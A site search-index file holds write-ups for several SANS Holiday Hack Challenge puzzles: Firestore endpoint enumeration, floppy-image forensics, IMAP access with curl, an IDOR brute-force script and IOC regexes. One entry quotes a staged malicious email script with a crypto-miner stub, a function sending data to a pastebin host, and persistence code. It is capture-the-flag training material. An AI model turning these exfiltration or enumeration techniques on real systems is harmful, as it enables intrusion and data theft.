var relearn_searchindex = [
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 3",
    "content": "Objective Difficulty: 3/5\nEnter the apartment building near 24-7 and help Thomas infiltrate the GnomeTea social network and discover the secret agent passphrase.\nThomas Bouve mission statement Hi there, I‚Äôm Thomas, but you can call me CraHan if you like.\nWhat do you mean ‚Äòweird accent‚Äô? I have no idea why people keep telling me that, but it sounds fine in my head, to be honest.\nAnyway, way back before I joined Counter Hack, I was an avid HHC player just like you! Some of my write-ups even resulted in a couple of wins throughout the years. Definitely check them out if you‚Äôre looking for some inspiration.\nIf you decide to submit your own report, my Holiday Hack Challenge report template might help you save some time as well.\nMy t-shirt? You like it? Well, Synthwave, cyberpunk, and even cassette futurism are definitely my kinda jam!\nI also love to tinker, but for some weird reason my drawer of unfinished hacking projects just keeps overflowing. 24 hours in a day simply isn‚Äôt enough time, I guess.\nOh‚Ä¶ and no matter what Mark or Kevin try to tell you, the Amiga is the absolute best retro computing platform ever made!\nHi again. Say, you wouldn‚Äôt happen to have time to help me out with something?\nThe gnomes have been oddly suspicious and whispering to each other. In fact, I could‚Äôve sworn I heard them use some sort of secret phrase. When I laughed right next to one, it said ‚Äúpassphrase denied‚Äù. I asked what that was all about but it just giggled and ran away.\nI know they‚Äôve been using GnomeTea to ‚Äúspill the tea‚Äù on one another, but I can‚Äôt sign up ‚Äòcause I‚Äôm obviously not a gnome. I could sure use your expertise to infiltrate this app and figure out what their secret passphrase is.\nI‚Äôve tried a few things already, but as usual the whole‚Ä¶ Uh, what‚Äôs the word I‚Äôm looking for here? Oh right, ‚Äúendeavor‚Äù, ended up with the rest of my unfinished projects.\nSolution Upon entering this mission we are presented with a website:\nWe have got a login form - usually in CTF‚Äôs these sometime reveal relevant error messages. Let‚Äôs see if we can provoke one by simply logging in with some random value:\nSure it does, of course it does. Somehow there is an Firebase data base lurking in the backend. Since Firebase is more than often coupled with Javascript, we look for some hints in the HTML source for some references. By inspecting the HTML source I see one interesting Javascript called https://gnometea.web.app/assets/index-BVLyJWJ_.js, and it does contain references to Firebase:\nInvestigation using Chat GPT The Javascript is heavily minified and difficult to read. Since we live in the AI era, I uploaded the Javascript to ChatGPT and issued the following prompt:\nAnd bingo! We have extracted gold!\nChatGPT output The file contains references to multiple Firestore collections and a Firebase Storage bucket. These were extracted from calls such as:\nhs(er, \"collectionName\") Ro(hs(er, \"collectionName\")) Yf(er, \"collectionName\", ...) 1. Firestore Collections (Name + Description) Collection Description gnomes Used in the app to store metadata about gnome entities, likely linked to profile avatars or characters. Extracted from repeated references to hs(er,\"gnomes\"). tea Appears to store ‚Äútea posts‚Äù or messages shown in the ‚Äútea feed‚Äù. Used in UI rendering. dms Direct messages between users. Extracted from hs(er,\"dms\") being passed into message components. admins Holds admin user records or permissions. Access checks reference this collection. users Primary user profiles (names, avatars, IDs, roles). Extensively referenced throughout the code. notifications Stores notification events for users. Seen in UI for listing alerts. These six collections are the only ones referenced in the JS bundle.\n2. Endpoints to View Each Collection Using your Firebase project ID discovered (holidayhack2025), the Firestore REST API allows direct unauthenticated GET requests if the database rules are permissive.\nTemplate:\nhttps://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/\u003ccollection\u003e Here are all collections with ready-to-use URLs:\nCollection URL gnomes https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/gnomes tea https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/tea dms https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms admins https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/admins users https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/users notifications https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/notifications To list all root-level collections:\nhttps://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents 3. Endpoints to View Firebase Storage Bucket Contents The JS file shows the bucket:\nholidayhack2025.firebasestorage.app Firebase Storage REST API uses the following format:\nList all items in bucket https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o List items under a specific folder https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o?prefix=\u003cfolder\u003e/ Download a file (if public) https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/\u003cpath\u003e?alt=media Get metadata for a file https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/\u003cpath\u003e Back to manual investigation Manual inspection As we can see from the previous section, ChatGPT is quite capable of extracting interesting information from obfuscated information. There are many interesting collections to look at it turns out. However, dms caught my interest the most.\nhttps://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms By reading through the various messages passing back and forth I found out that a gnome named Barnaby Briefcase has forgotten his password. He reached out to Glitch Mitnick to reset it. Barnaby is reluctant to give out his password\nThomas Bouve mission debrief",
    "description": "Objective Difficulty: 3/5\nEnter the apartment building near 24-7 and help Thomas infiltrate the GnomeTea social network and discover the secret agent passphrase.\nThomas Bouve mission statement Hi there, I‚Äôm Thomas, but you can call me CraHan if you like.\nWhat do you mean ‚Äòweird accent‚Äô? I have no idea why people keep telling me that, but it sounds fine in my head, to be honest.",
    "tags": [],
    "title": "Gnome Tea",
    "uri": "/act3/gnome-tea/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 2",
    "content": "Objective Difficulty: 2/5\nJoin Mark in the retro shop. Analyze his disk image for a blast from the retro past and recover some classic treasures.\nMark DeVito mission statement I am an avid collector of things of the past. I love old technology. I love how it connects us to the past. Some remind me of my dad, who was an engineer on the Apollo 11 mission and helped develop the rendezvous and altimeter radar on the space craft.\nIf you ever get into collecting things like vintage computers, here is a tip. Never forget to remove the RIFA capacitors from vintage computer power supplies when restoring a system. If not they can pop and fill the room with nasty smoke.\nI love vintage computing, it‚Äôs the very core of where and when it all began. I still enjoy writing programs in BASIC and have started re-learning Apple II assembly language. I started writing code in 1982 on a Commodore CBM.\nSometimes it is the people no one can imagine anything of who do the things no one can imagine. - Alan Turing\nYou never forget your first 8-bit system.\nThere‚Äôs something in the works. Come see me later and we‚Äôll talk.\nWhile Kevin and I were cleaning up the Retro Store, we found this FAT12 floppy disk image, must have been under this arcade machine for years. These disks were the heart of machines like the Commodore 64. I am so glad you can still mount them on a modern PC.\nWhen I was a kid we shared warez by hiding things as deleted files.\nI remember writing programs in BASIC. So much fun! My favorite was Star Trek.\nThe beauty of file systems is that ‚Äòdeleted‚Äô doesn‚Äôt always mean gone forever.\nReady to dive into some digital archaeology and see what secrets this old disk is hiding?\nGo to Items in your badge, download the floppy disk image, and see what you can find!\nSolution Identify the Filesystem Format Command file floppy.img What the command does file inspects the binary header of a file and determines its type based on internal signatures. For disk images, this reveals the boot sector format, the filesystem, and other metadata. This is the quickest way to understand what you‚Äôre working with before attempting any forensic recovery.\nOutput floppy.img: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID \"mkfs.fat\", root entries 224, sectors 2880 (volumes \u003c=32 MB), sectors/FAT 9, sectors/track 18, reserved 0x1, serial number 0x9c01e8ae, unlabeled, FAT (12 bit), followed by FAT Why this output matters This confirms the disk is a 1.44MB FAT12 floppy image, which aligns perfectly with the retro-computing context. FAT12 is simple, and deleted file recovery works reliably‚Äîexactly what the challenge hints suggested.\nScan for Embedded Data or Hidden Binaries Command binwalk floppy.img What the command does binwalk scans a binary file for recognizable signatures (compressed files, strings, executables, archives, etc.). This helps determine whether the hidden content is embedded somewhere outside the filesystem.\nOutput DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 133776 0x20A90 Copyright string: \"Copyright Microsoft Corporation 1982-1988.\" 143535 0x230AF Copyright string: \"Copyright (C) Microsoft Corp 1982-1987. All rights reserved.\" 222225 0x36411 Copyright string: \"Copyright Microsoft Corporation, 1982-1988.\" 258196 0x3F094 Copyright string: \"Copyright (C) Microsoft Corp 1983-1988. %s.\" 327297 0x4FE81 Copyright string: \"Copyright (C) Microsoft Corp 1983-1988. %s.\" 343826 0x53F12 Copyright string: \"Copyright (C) Microsoft Corp 1983-1988. All rights reserved.\" 614815 0x9619F Copyright string: \"Copyright Microsoft Corporation, 1985-1988.\" Why this output matters The scan shows only DOS copyright strings. No hidden archives or payloads exist in raw sectors. This strongly suggests the hidden clue is inside the filesystem, not outside it.\nExamine the FAT12 Filesystem Structure Command fsstat floppy.img What the command does fsstat (Sleuth Kit) prints a complete map of the filesystem: FAT offsets, root directory location, cluster sizes, and layout. This is vital for knowing where deleted files live and how to extract them.\nOutput FILE SYSTEM INFORMATION -------------------------------------------- File System Type: FAT12 OEM Name: mkfs.fat Volume ID: 0x9c01e8ae Volume Label (Boot Sector): NO NAME Volume Label (Root Directory): File System Type Label: FAT12 Sectors before file system: 0 File System Layout (in sectors) Total Range: 0 - 2879 * Reserved: 0 - 0 ** Boot Sector: 0 * FAT 0: 1 - 9 * FAT 1: 10 - 18 * Data Area: 19 - 2879 ** Root Directory: 19 - 32 ** Cluster Area: 33 - 2879 METADATA INFORMATION -------------------------------------------- Range: 2 - 45782 Root Directory: 2 CONTENT INFORMATION -------------------------------------------- Sector Size: 512 Cluster Size: 512 Total Cluster Range: 2 - 2848 FAT CONTENTS (in sectors) -------------------------------------------- 93-93 (1) -\u003e EOF 94-284 (191) -\u003e EOF 285-436 (152) -\u003e EOF 437-506 (70) -\u003e EOF 507-642 (136) -\u003e EOF 643-671 (29) -\u003e EOF 672-690 (19) -\u003e EOF 691-1235 (545) -\u003e EOF 1236-1236 (1) -\u003e EOF Why this output matters The root directory only covers sectors 19‚Äì32, so deleted file entries will be easy to enumerate. Cluster size is 512 bytes, making carving straightforward.\nList Everything in the Filesystem (Including Deleted Markers) Command fls -r floppy.img What the command does fls lists files inside the filesystem.\nThe -r flag prints them recursively. Deleted entries appear with an asterisk *. Output r/r * 6: all_i-want_for_christmas.bas d/d 8: qb45 + r/r 1189: BC.EXE + r/r 1190: BRUN45.EXE + r/r 1191: LIB.EXE + r/r 1192: LINK.EXE + r/r 1193: MOUSE.COM + r/r 1196: PACKING.LST.txt + r/r 1197: QB.EXE + r/r 1198: QB.INI r/r * 10: .all_i-want_f v/v 45779: $MBR v/v 45780: $FAT1 v/v 45781: $FAT2 V/V 45782: $OrphanFiles Why this output matters Two deleted files jump out:\nall_i-want_for_christmas.bas .all_i-want_f Both are likely hiding the challenge solution.\nList Only Deleted Files Command fls -rd floppy.img What the command does Adds -d, which filters to show deleted entries only. This clarifies which files require recovery.\nOutput r/r * 6: all_i-want_for_christmas.bas r/r * 10: .all_i-want_f Why this output matters These are the only two deleted files. This matches the retro computing hint about ‚Äúhiding things as deleted files‚Äù.\nRecover the Deleted Files Commands icat floppy.img 6 \u003e all_i-want_for_christmas.bas icat floppy.img 10 \u003e all_i-want_f What the commands do icat extracts file content directly from its inode/record number, independent of whether it is deleted. This avoids relying on the operating system and ensures a clean carve from disk clusters.\nWhy this matters Now we can analyze the contents of the hidden files.\nInspect the Small Deleted File Command strings all_i-want_f What the command does strings prints printable ASCII sequences. Useful for scanning binary or partially overwritten files for readable content.\nOutput b0nano 7.2 mark arcade all_i-want_for_christmas.bas Why this output matters The content is minimal, but it directly references the BASIC program. This hints that the real clue is inside all_i-want_for_christmas.bas.\nInspect the Large BASIC Program Command strings all_i-want_for_christmas.bas What the command does Shows all readable strings in the recovered BASIC file, which appears to be a Star Trek-style text game.\nRelevant Output A full Star Trek BASIC program appears, and inside it is a Base64-encoded line (line 211).\nWhy this output matters The encoded string is clearly placed as a hidden message embedded in the program. This is the actual target of the challenge.\nDecode the Hidden Base64 Payload Command echo \"bWVycnkgY2hyaXN0bWFzIHRvIGFsbCBhbmQgdG8gYWxsIGEgZ29vZCBuaWdodAo=\" | base64 -d What the command does Decodes Base64 into plain text.\nOutput merry christmas to all and to all a good night Why this output matters This is the exact hidden message embedded in the recovered program. It serves as the challenge solution / flag.\nFinal Flag merry christmas to all and to all a good night\nMark DeVito mission debrief Excellent work! You‚Äôve successfully recovered that deleted file and decoded the hidden message.\nSometimes the old ways are the best ways. Vintage file systems never truly forget what they‚Äôve seen. Play some Star Trek‚Ä¶ it actually works.",
    "description": "Objective Difficulty: 2/5\nJoin Mark in the retro shop. Analyze his disk image for a blast from the retro past and recover some classic treasures.\nMark DeVito mission statement I am an avid collector of things of the past. I love old technology. I love how it connects us to the past. Some remind me of my dad, who was an engineer on the Apollo 11 mission and helped develop the rendezvous and altimeter radar on the space craft.",
    "tags": [],
    "title": "Retro Recovery",
    "uri": "/act2/retro-recovery/index.html"
  },
  {
    "breadcrumb": "Intro",
    "content": "The Counter Hack crew is in the Neighborhood festively preparing for the holidays when they are suddenly overrun by lively Gnomes in Your Home! There must have been some magic in those Gnomes, because, due to some unseen spark, some haunting hocus pocus, they have come to life and are now scurrying around the Neighborhood.",
    "description": "The Counter Hack crew is in the Neighborhood festively preparing for the holidays when they are suddenly overrun by lively Gnomes in Your Home! There must have been some magic in those Gnomes, because, due to some unseen spark, some haunting hocus pocus, they have come to life and are now scurrying around the Neighborhood.",
    "tags": [],
    "title": "Act 1",
    "uri": "/act1/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 3",
    "content": "Objective Difficulty: 1/5\nSkate over to Jared at the frozen pond for some network magic and learn the ropes by the hockey rink.\nXXX mission statement Solution XXX mission debrief",
    "description": "Objective Difficulty: 1/5\nSkate over to Jared at the frozen pond for some network magic and learn the ropes by the hockey rink.\nXXX mission statement Solution XXX mission debrief",
    "tags": [],
    "title": "Hack-a-Gnome",
    "uri": "/act3/hack-a-gnome/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 2",
    "content": "Objective Difficulty: 2/5\nHelp Mo in City Hall solve a curly email caper and crack the IMAP case. What is the URL of the pastebin service the gnomes are using?\nMaurice Wilson mission statement Hey there! I‚Äôm Mo, on loan from the Air Force, and let me tell you - Counter Hack is the best job I have ever had!\nThere is something in the works. Come see me later and we will talk. Can‚Äôt say much right now, but check back later. You might be interested.\nSo here‚Äôs our situation: those gnomes have been sending JavaScript-enabled emails to everyone in the neighborhood, and it‚Äôs causing chaos.\nWe had to shut down all the email clients because they weren‚Äôt blocking the malicious scripts - kind of like how we‚Äôd ground aircraft until we clear a security threat.\nThe only safe way to access the email server now is through curl - yes, the HTTP tool!\nThink you can help me use curl to connect to the IMAP server and hunt down one of these gnome emails?\nMail Detective: Curly IMAP Investigation To solve this objective, we must use curl as a lightweight IMAP client. Because curl supports IMAP natively, we can authenticate and talk directly to the mail server. The first step is to list the available mailboxes:\ncurl \"imap://localhost:143/\" -u \"dosismail:holidaymagic\" With no mailbox or message specified, curl sends an IMAP LIST command. This asks the server to return all mailboxes accessible to the user. The response looks like:\n* LIST (\\HasNoChildren) \".\" Spam * LIST (\\HasNoChildren) \".\" Sent * LIST (\\HasNoChildren) \".\" Archives * LIST (\\HasNoChildren) \".\" Drafts * LIST (\\HasNoChildren) \".\" INBOX Each line describes a single mailbox. The IMAP attribute \\HasNoChildren indicates that the folder has no subfolders, \".\" is the server‚Äôs hierarchy delimiter, and the final token is the mailbox name. This confirms that authentication succeeded and shows which folders we can query.\nWith the mailbox names in hand, we can start retrieving individual messages by their IMAP UID. For example:\ncurl \"imap://localhost:143/INBOX;UID=1\" -u \"dosismail:holidaymagic\" fetches the message with UID 1 from INBOX. I iterated through all messages in INBOX but found nothing useful. I then repeated the process for the other folders. It wasn‚Äôt until I inspected the Spam folder that I found something interesting:\ncurl \"imap://localhost:143/Spam;UID=2\" -u \"dosismail:holidaymagic\" The second message in the Spam folder contained the email I was looking for:\nReturn-Path: \u003cfrozen.network@mysterymastermind.mail\u003e Delivered-To: dosis.residents@dosisneighborhood.mail Received: from frost-command.mysterymastermind.mail (frost-command [10.0.0.15]) by mail.dosisneighborhood.mail (Postfix) with ESMTP id GHI789 for \u003cdosis.residents@dosisneighborhood.mail\u003e; Mon, 16 Sep 2025 12:10:00 +0000 (UTC) From: \"Frozen Network Bot\" \u003cfrozen.network@mysterymastermind.mail\u003e To: \"Dosis Neighborhood Residents\" \u003cdosis.residents@dosisneighborhood.mail\u003e Cc: \"Jessica and Joshua\" \u003csiblings@dosisneighborhood.mail\u003e, \"CHI Team\" \u003cchi.team@counterhack.com\u003e Subject: Frost Protocol: Dosis Neighborhood Freezing Initiative Date: Mon, 16 Sep 2025 12:10:00 +0000 Message-ID: \u003cgnome-js-3@mysterymastermind.mail\u003e MIME-Version: 1.0 Content-Type: text/html; charset=UTF-8 Content-Transfer-Encoding: 7bit \u003chtml\u003e \u003cbody\u003e \u003ch1\u003ePerpetual Winter Protocol Activated\u003c/h1\u003e \u003cp\u003eThe mysterious mastermind's plan is proceeding... Dosis neighborhood will never thaw!\u003c/p\u003e \u003cscript\u003e function initCryptoMiner() { var worker = { start: function() { console.log(\"Frost's crypto miner started - mining FrostCoin for perpetual winter fund\"); this.interval = setInterval(function() { console.log(\"Mining FrostCoin... Hash rate: \" + Math.floor(Math.random() * 1000) + \" H/s\"); }, 5000); }, stop: function() { clearInterval(this.interval); } }; worker.start(); return worker; } function exfiltrateData() { var sensitiveData = { hvacSystems: \"Located \" + Math.floor(Math.random() * 50) + \" cooling units\", thermostatData: \"Temperature ranges: \" + Math.floor(Math.random() * 30 + 60) + \"¬∞F\", refrigerationUnits: \"Found \" + Math.floor(Math.random() * 20) + \" commercial freezers\", timestamp: new Date().toISOString() }; console.log(\"Exfiltrating data to Frost's command center:\", sensitiveData); var encodedData = btoa(JSON.stringify(sensitiveData)); console.log(\"Encoded payload for Frost: \" + encodedData.substr(0, 50) + \"...\"); // pastebin exfiltration var pastebinUrl = \"https://frostbin.atnas.mail/api/paste\"; var exfilPayload = { title: \"HVAC_Survey_\" + Date.now(), content: encodedData, expiration: \"1W\", private: \"1\", format: \"json\" }; console.log(\"Sending stolen data to FrostBin pastebin service...\"); console.log(\"POST \" + pastebinUrl); console.log(\"Payload: \" + JSON.stringify(exfilPayload).substr(0, 100) + \"...\"); console.log(\"Response: {\\\"id\\\":\\\"\" + Math.random().toString(36).substr(2, 8) + \"\\\",\\\"url\\\":\\\"https://frostbin.atnas.mail/raw/\" + Math.random().toString(36).substr(2, 8) + \"\\\"}\"); } function establishPersistence() { // Service worker registration if ('serviceWorker' in navigator) { console.log(\"Attempting to register Frost's persistent service worker...\"); console.log(\"Frost's persistence mechanism deployed\"); } localStorage.setItem(\"frost_persistence\", JSON.stringify({ installDate: new Date().toISOString(), version: \"gnome_v2.0\", mission: \"perpetual_winter_protocol\" })); } var miner = initCryptoMiner(); exfiltrateData(); establishPersistence(); document.title = \"Frost's Gnome Network - Temperature Control\"; alert(\"All cooling systems in Dosis neighborhood are now property of Frost!\"); document.body.innerHTML += \"\u003cp style='color: cyan;'\u003e‚ùÑÔ∏è FROST'S DOMAIN ‚ùÑÔ∏è\u003c/p\u003e\"; // Cleanup after 30 seconds setTimeout(function() { miner.stop(); console.log(\"Frost's operations going dark... tracks covered\"); }, 30000); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e The URL of the pastebin services the gnomes are using is https://frostbin.atnas.mail/api/paste\nMaurice Wilson mission debrief Outstanding work! You‚Äôve mastered using curl for IMAP - that‚Äôs some serious command-line skills that would make any Air Force tech proud.\nCounter Hack really is the best job I have ever had, especially when we get to solve problems like this!",
    "description": "Objective Difficulty: 2/5\nHelp Mo in City Hall solve a curly email caper and crack the IMAP case. What is the URL of the pastebin service the gnomes are using?\nMaurice Wilson mission statement Hey there! I‚Äôm Mo, on loan from the Air Force, and let me tell you - Counter Hack is the best job I have ever had!\nThere is something in the works. Come see me later and we will talk. Can‚Äôt say much right now, but check back later. You might be interested.",
    "tags": [],
    "title": "Mail Detective",
    "uri": "/act2/mail-detective/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 1",
    "content": "Objective Difficulty: 1/5\nMeet Lynn Schifano on the train for a warm welcome and get ready for your journey around the Dosis Neighborhood.\nLynn Schifano mission statement Welcome to the 2025 SANS Holiday Hack Challenge! We‚Äôre on a train heading‚Ä¶ NOT to the North Pole, but instead to The Neighborhood. Your cybersecurity skills are needed there this year! I‚Äôm here to help orient you to this year‚Äôs exciting challenge.\nI‚Äôm the Chief of Staff at Counter Hack, making sure the right people are doing the right thing at the right place at the right time ‚Äì Herding cats, in other words.\nI love sports, especially college basketball. My favorite teams are Monmouth University, Louisville, and Syracuse.\nI‚Äôm a Queens Girl living my best life at the beautiful Jersey Shore.\nI‚Äôm a proud Mom of three and Grandma of one (so far!! üôè).\nHey, think you can give this terminal a try? Just click on it and follow the instructions.\nOn one of my attempt to grab a screenshot, no character showed up:\nTerminal 1 Lynn Schifano mission debrief Great work! Please, hop off the train and explore the neighborhood.\nWe‚Äôre so glad to have you here!\nOh, one more thing! You can press Q and E to rotate the map around. It gives you a nice semi-3D view of the area - really helps when you need to look around buildings and objects. Pretty neat, right? Give it a spin!",
    "description": "Objective Difficulty: 1/5\nMeet Lynn Schifano on the train for a warm welcome and get ready for your journey around the Dosis Neighborhood.\nLynn Schifano mission statement Welcome to the 2025 SANS Holiday Hack Challenge! We‚Äôre on a train heading‚Ä¶ NOT to the North Pole, but instead to The Neighborhood. Your cybersecurity skills are needed there this year! I‚Äôm here to help orient you to this year‚Äôs exciting challenge.",
    "tags": [],
    "title": "Holiday Hack Orientation",
    "uri": "/act1/holiday-hack-orientation/index.html"
  },
  {
    "breadcrumb": "Intro",
    "content": "The Gnomes‚Äô nefarious plot seems to involve stealing refrigerator parts. But why?",
    "description": "The Gnomes‚Äô nefarious plot seems to involve stealing refrigerator parts. But why?",
    "tags": [],
    "title": "Act 2",
    "uri": "/act2/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 3",
    "content": "Objective Difficulty: 3/5\nEnter the apartment building near 24-7 and help Thomas infiltrate the GnomeTea social network and discover the secret agent passphrase.\nXXX mission statement Hi there, I‚Äôm Thomas, but you can call me CraHan if you like.\nWhat do you mean ‚Äòweird accent‚Äô? I have no idea why people keep telling me that, but it sounds fine in my head, to be honest.\nAnyway, way back before I joined Counter Hack, I was an avid HHC player just like you! Some of my write-ups even resulted in a couple of wins throughout the years. Definitely check them out if you‚Äôre looking for some inspiration.\nIf you decide to submit your own report, my Holiday Hack Challenge report template might help you save some time as well.\nMy t-shirt? You like it? Well, Synthwave, cyberpunk, and even cassette futurism are definitely my kinda jam!\nI also love to tinker, but for some weird reason my drawer of unfinished hacking projects just keeps overflowing. 24 hours in a day simply isn‚Äôt enough time, I guess.\nOh‚Ä¶ and no matter what Mark or Kevin try to tell you, the Amiga is the absolute best retro computing platform ever made!\nHi again. Say, you wouldn‚Äôt happen to have time to help me out with something?\nThe gnomes have been oddly suspicious and whispering to each other. In fact, I could‚Äôve sworn I heard them use some sort of secret phrase. When I laughed right next to one, it said ‚Äúpassphrase denied‚Äù. I asked what that was all about but it just giggled and ran away.\nI know they‚Äôve been using GnomeTea to ‚Äúspill the tea‚Äù on one another, but I can‚Äôt sign up ‚Äòcause I‚Äôm obviously not a gnome. I could sure use your expertise to infiltrate this app and figure out what their secret passphrase is.\nI‚Äôve tried a few things already, but as usual the whole‚Ä¶ Uh, what‚Äôs the word I‚Äôm looking for here? Oh right, ‚Äúendeavor‚Äù, ended up with the rest of my unfinished projects.\nSolution XXX mission debrief",
    "description": "Objective Difficulty: 3/5\nEnter the apartment building near 24-7 and help Thomas infiltrate the GnomeTea social network and discover the secret agent passphrase.\nXXX mission statement Hi there, I‚Äôm Thomas, but you can call me CraHan if you like.\nWhat do you mean ‚Äòweird accent‚Äô? I have no idea why people keep telling me that, but it sounds fine in my head, to be honest.",
    "tags": [],
    "title": "Snowcat RCE \u0026 Priv Esc",
    "uri": "/act3/snowcat-rce-and-priv-esc/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 2",
    "content": "Objective Difficulty: 2/5\nJosh has a tasty IDOR treat for you‚Äîstop by Sasabune for a bite of vulnerability. What is the name of the gnome?\nJosh Wright mission statement I‚Äôm a teetotling hacker.\nI sleep about 4 hours a night.\nPhotography is my hobby, but the anachronistic sort: before 1900.\nTeaching people how to hack and protect systems is my passion.\nI need your help with something urgent.\nA gnome came through Sasabune today, poorly disguising itself as human - apparently asking for frozen sushi, which is almost as terrible as that fusion disaster I had to endure that one time.\nBased on my previous work finding IDOR bugs in restaurant payment systems, I suspect we can exploit a similar vulnerability here.\nI was‚Ä¶at a talk recently‚Ä¶and learned some interesting things about some of these payment systems. Let‚Äôs use that receipt to dig deeper and unmask this gnome‚Äôs true identity.\nDid you see that receipt outside the door?\nIdorable Bistro Josh mentioned that there was a receipt outside the door. I went outside and to the right of the building and found this item:\nParsing the QR I found out that it leads to https://its-idorable.holidayhackchallenge.com/receipt/i9j0k1l2:\nUpon visiting we are presented with the following webpage:\nUpon inspecting the HTML code we find something interesting in a Javascript:\nWe find that the current receipt ID is 103 and that the real endpoint is /api/receipt?id=${id}, which takes an id parameter. Toying with this I found a lower boundary of 100 and an upper boundary of 160 appropiate. I could have narrowed further down, but I saw no point in doing that.\nNow, in order to traverse recipts in the range 100 to 160 I could do it manually, which would have taken too much time, or whip up a quick Python based bruteforcer. I went the Python route using this code:\nimport requests from pprint import pprint url = \"https://its-idorable.holidayhackchallenge.com/api/receipt?id=\" for i in range(100, 160, 1): r = requests.get(f\"{url}{i}\") if \"frozen\" in r.text.lower(): pprint(r.json()) I knew the gnome asked for a frozen sushi, so I made the code look for any occurrence of the word ‚Äòfrozen‚Äô. After a short while, I found the answer:\n{'customer': 'Bartholomew Quibblefrost', 'date': '2025-12-20', 'id': 139, 'items': [{'name': 'Frozen Roll (waitress improvised: sorbet, a hint of dry ' 'ice)', 'price': 19.0}], 'note': 'Insisted on increasingly bizarre rolls and demanded one be served ' \"frozen. The waitress invented a 'Frozen Roll' on the spot with \" 'sorbet and a puff of theatrical smoke. He nodded solemnly and asked ' 'if we could make these in bulk.', 'paid': True, 'table': 14, 'total': 19.0} The gnomes name is Bartholomew Quibblefrost\nJosh Wright mission debrief Excellent work exploiting that IDOR vulnerability - textbook execution.\nNow we know exactly which gnome tried to pass itself off as a sushi connoisseur. Frozen rolls‚Ä¶ honestly, what‚Äôs next?",
    "description": "Objective Difficulty: 2/5\nJosh has a tasty IDOR treat for you‚Äîstop by Sasabune for a bite of vulnerability. What is the name of the gnome?\nJosh Wright mission statement I‚Äôm a teetotling hacker.\nI sleep about 4 hours a night.\nPhotography is my hobby, but the anachronistic sort: before 1900.\nTeaching people how to hack and protect systems is my passion.",
    "tags": [],
    "title": "Idorable Bistro",
    "uri": "/act2/idorable-bistro/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 1",
    "content": "Objective Difficulty: 1/5\nFind Ed Skoudis upstairs in City Hall and help him troubleshoot a clever phishing tool in his cozy office.\nEd Skoudis mission statement I‚Äôm the Founder of Counter Hack Innovations, the team that brings you the SANS Holiday Hack Challenge for the last 22 years.\nI‚Äôm also the President of the SANS Technology Institute College, which has over 2,300 students studying for their Bachelor‚Äôs Degrees, Master‚Äôs Degrees, and various certificates.\nI was the original author of the SANS SEC504 (Incident Handling and Hacker Attacks) and SANS SEC560 (Enterprise Penetration Testing) courses.\nI love Capture the Flag games and puzzles.\nI‚Äôve got a steampunk office filled with secret rooms, and I collect antique crypto systems and communication technologies.\nI‚Äôve got an original Enigma machine (A726, from the early war years), a leaf of the Gutenberg Bible (1 John 2:3 to 4:16) from 1455, and a Kryha Liliput from the 1920s.\nOh gosh, I could talk for hours about this stuff but I really need your help!\nThe team has been working on this new SOC tool that helps triage phishing emails‚Ä¶and there are some‚Ä¶issues.\nWe have had some pretty sketchy emails coming through and we need to make sure we block ALL of the indicators of compromise. Can you help me? No pressure‚Ä¶\nIts all about the defang terminal Extract IOCs (Step 1) Domain \\b(?!(?:\\d+\\.)+\\d+\\b)(?:[a-z0-9-]+\\.)+(?!(?:exe|corp)\\b)[a-z]{2,63}\\b icicleinnovations.mail mail.icicleinnovations.mail core.icicleinnovations.mail IP addresses \\b(?!(10)\\.)(?:(?:25[0-5]|2[0-4][0-9]|1?\\d{1,2})\\.){3}(?:25[0-5]|2[0-4][0-9]|1?\\d{1,2})\\b 172.16.254.1 192.168.1.1 URLs For this one I just nicked the provided regex for URLs and replaced the start http with a fuzzier version https?\nhttps?://[a-zA-Z0-9-]+(\\.[a-zA-Z0-9-]+)+(:[0-9]+)?(/[^\\s]*)? https://icicleinnovations.mail/renovation-planner.exe https://icicleinnovations.mail/upload_photos Emails The provided regex example worked like a charm:\n\\b[a-zA-Z0-9._%+-]+@(?:[A-Za-z0-9-]+\\.)+(?!corp\\b)[A-Za-z]{2,63}\\b sales@icicleinnovations.mail info@icicleinnovations.mail Defang \u0026 Report (Step 2) s/\\./[.]/g; s/@/[@]/g; s/:\\//[://]/g; s/http/hxxp/g It is worth mentioning that the system helps you in great ways on what should be submitted. For instance, upon submission you are presented with a warning like this if anything is wrong:\nUpon successful completion we see the report:\nEd Skoudis mission debrief Well you just made that look like a piece of cake! Though I prefer cookies‚Ä¶I know where to find the best in town!\nThanks again! See ya ‚Äòround!\nExtras Ed‚Äôs wild history on getting an Enigma machine I looked into this claim and found out Ed had documented it in a PDF located here: Please Keep Your Brain Juice Off My Enigma\nThe said Enigma machine:\nThe story follows cybersecurity professionals Ed Skoudis and Josh Wright as they embark on an unusual mission to purchase a genuine World War II Enigma machine. Ed first learned of a potential seller‚ÄîDr. Tom, a retired professor and Enigma enthusiast‚Äîthrough a broker named Dr. David. After earlier negotiations had stalled for unrelated personal reasons, Ed reconnected a year later and found that several Enigmas were available again.\nEd and Josh arranged a visit to Dr. Tom‚Äôs remote mountain 